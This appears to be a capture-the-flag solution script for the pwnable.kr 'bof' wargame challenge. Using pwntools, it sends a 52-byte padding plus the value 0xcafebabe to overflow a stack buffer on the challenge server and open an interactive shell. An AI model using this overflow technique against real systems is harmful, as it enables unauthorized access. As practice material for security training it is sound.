from pwn import *

host, port = 'pwnable.kr', 9000

payload = 'A'*52
payload += p32(0xcafebabe)

s = remote(host,port)
s.send(payload)
s.interactive()
